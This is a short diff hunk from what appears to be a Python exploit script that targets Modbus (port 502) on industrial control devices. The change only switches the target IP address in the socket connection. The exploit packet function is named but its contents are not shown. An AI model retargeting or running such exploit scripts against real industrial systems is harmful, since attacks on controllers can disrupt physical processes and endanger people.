@@ -36,7 +36,7 @@ exploit_packet = create_exploit_packet()
 
 # Create a socket and connect
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.95.10", 502))   # IP and port
+s.connect(("10.103.152.8", 502))   # IP and port
 ss = StreamSocket(s, Raw)
 
 try:
